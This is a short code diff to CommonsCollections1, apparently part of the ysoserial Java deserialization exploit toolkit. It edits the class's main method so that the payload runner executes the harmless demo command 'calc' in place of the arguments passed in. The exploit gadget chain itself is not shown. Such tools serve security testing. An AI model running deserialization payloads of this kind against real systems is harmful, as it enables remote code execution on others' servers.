@@ -80,7 +80,8 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 	}
 
 	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsCollections1.class, args);
+		//PayloadRunner.run(CommonsCollections1.class, args);
+		PayloadRunner.run(CommonsCollections1.class, new String[]{"calc"});
 	}
 
 	public static boolean isApplicableJavaVersion() {
